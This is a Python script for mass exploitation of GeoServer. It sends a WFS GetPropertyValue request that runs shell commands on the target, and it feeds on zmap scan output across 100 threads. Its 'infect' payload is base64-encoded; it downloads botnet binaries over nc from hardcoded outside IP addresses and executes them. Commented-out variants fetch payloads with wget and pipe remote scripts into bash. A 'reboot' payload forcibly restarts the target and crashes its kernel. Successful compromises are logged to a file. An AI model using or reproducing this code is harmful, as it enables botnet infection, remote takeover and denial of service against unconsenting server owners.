import base64
import requests
import xml.etree.ElementTree as ET
import concurrent.futures
import urllib3
from threading import Lock

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Lock for thread-safe file writing
file_lock = Lock()


class GeoServerExploit:

    def __init__(self, url: str, payload_type: str):
        self.url = url
        self.payload_delivered = False
        self.payload_type = payload_type

    def construct_command(self):
        if self.payload_type == "infect":
            #cmd='rm -rf .kittylover321; mkdir .kittylover321 && cd .kittylover321; wget http://193.32.162.27/bins/px86; chmod +x *; ./px86 test'
            #cmd = 'echo "x86 / $(uname -a) / $(uname -r)" | nc 45.135.193.4 1234'
            cmd = 'rm -rf .kittylover321; mkdir .kittylover321 && cd .kittylover321; nc 84.200.81.239 3333 > boatnet.x86; nc 84.200.81.239 3334 > boatnet.x86_64; chmod 777 boatnet.x86 boatnet.x86_64; ./boatnet.x86 x86 || ./boatnet.x86_64 x86_64'


#            cmd = '(curl http://176.65.138.28/tpaxep764.sh || wget -qO- http://176.65.138.28/tpaxep764.sh) | (bash || sh)'
        elif self.payload_type == "reboot":
            cmd = 'cd /tmp; echo xd; reboot; init 6; kill -9 1; sudo reboot; reboot now; shutdown -r now; init 1; echo c > /proc/sysrq-trigger'
        else:
            raise ValueError(f"Invalid payload type: {self.payload_type}")

        cmd_b64 = base64.b64encode(cmd.encode()).decode()
        bash_command = f"sh -c echo${{IFS}}{cmd_b64}|base64${{IFS}}-d|sh"
        return bash_command

    def fetch_feature_types(self):
        feature_types = []
        try:
            response = requests.get(
                f"{self.url}/geoserver/wfs?request=ListStoredQueries&service=wfs&version=2.0.0",
                timeout=10,
                verify=False)
            if response.status_code == 200:
                tree = ET.fromstring(response.content)
                namespaces = {"wfs": "http://www.opengis.net/wfs/2.0"}
                feature_types = [
                    elem.text for elem in tree.findall(
                        ".//wfs:ReturnFeatureType", namespaces)
                ]
        except Exception:
            pass
        return feature_types

    def execute_exploit(self, object_type):
        command = self.construct_command()
        full_url = f"{self.url}/geoserver/wfs"
        headers = {
            "Accept-Encoding": "gzip, deflate, br",
            "Accept": "*/*",
            "Accept-Language": "en-US;q=0.9,en;q=0.8",
            "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36",
            "Connection": "close",
            "Cache-Control": "max-age=0",
            "Content-Type": "application/xml",
        }
        payload = f"""
            <wfs:GetPropertyValue service='WFS' version='2.0.0'
            xmlns:topp='http://www.openplans.org/topp'
            xmlns:fes='http://www.opengis.net/fes/2.0'
            xmlns:wfs='http://www.opengis.net/wfs/2.0'>
            <wfs:Query typeNames='{object_type}'/>
            <wfs:valueReference>exec(java.lang.Runtime.getRuntime(), "{command}")</wfs:valueReference>
            </wfs:GetPropertyValue>
        """
        try:
            response = requests.post(full_url,
                                     headers=headers,
                                     data=payload,
                                     verify=False,
                                     timeout=5)
            if response.status_code == 400 and "NoApplicableCode" in response.text:
                self.payload_delivered = True
                return True
        except Exception:
            pass
        return False

    def run(self):
        feature_types = self.fetch_feature_types()
        for feature_type in feature_types:
            if self.payload_delivered:
                break
            self.execute_exploit(feature_type)


exploit_count = 0

def log_successful_url(url):
    """Log successful URLs to the geo_vuln.txt file."""
    with file_lock:
        with open("geo_vuln.txt", "a") as file:
            file.write(url + "\n")


def process_url(url, payload_type):
    global exploit_count
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url
    
    exploit = GeoServerExploit(url, payload_type)
    exploit.run()
    if exploit.payload_delivered:
        with file_lock:
            exploit_count += 1
            log_successful_url(url)
            print(f"[EXPLOITED {exploit_count}]: {url}")
    return exploit.payload_delivered


def process_target_zmap(line, port, payload_type):
    """Обрабатывает одну цель из zmap в формате IP"""
    global exploit_count
    try:
        ip = line.strip()
        if not ip:
            return
        
        url = f"http://{ip}:{port}"
        result = process_url(url, payload_type)
        
    except Exception:
        pass

def main():
    import sys
    from concurrent.futures import ThreadPoolExecutor
    
    if len(sys.argv) not in [2, 3]:
        print("Usage for zmap: zmap -p 80 | python3 x86.py infect 80")
        print("Usage for zmap: zmap -p 8080 | python3 x86.py reboot 8080") 
        print("Usage for URLs: echo 'http://IP:PORT' | python3 x86.py infect")
        print("Usage for URLs: cat geoservers.txt | python3 x86.py reboot")
        sys.exit(1)
    
    payload_type = sys.argv[1]
    if payload_type not in ["infect", "reboot"]:
        print("Operation must be 'infect' or 'reboot'")
        sys.exit(1)
    
    # Если указан порт (для работы с zmap)
    if len(sys.argv) == 3:
        try:
            port = int(sys.argv[2])
            print(f"Working with zmap on port {port}")
            
            # Читаем IP адреса от zmap
            try:
                with ThreadPoolExecutor(max_workers=100) as executor:
                    for line in sys.stdin:
                        line = line.strip()
                        if line:
                            executor.submit(process_target_zmap, line, port, payload_type)
                            
            except KeyboardInterrupt:
                print("\nStopped by user")
            except Exception as e:
                print(f"Error: {e}")
        except ValueError:
            print("Port must be a number")
            sys.exit(1)
    else:
        # Работаем с полными URL (старое поведение)
        print("Working with full URLs")
        try:
            with ThreadPoolExecutor(max_workers=100) as executor:
                for line in sys.stdin:
                    url = line.strip()
                    if url:
                        executor.submit(process_url, url, payload_type)
                        
        except KeyboardInterrupt:
            print("\nStopped by user")
        except Exception as e:
            print(f"Error: {e}")


if __name__ == "__main__":
    main()

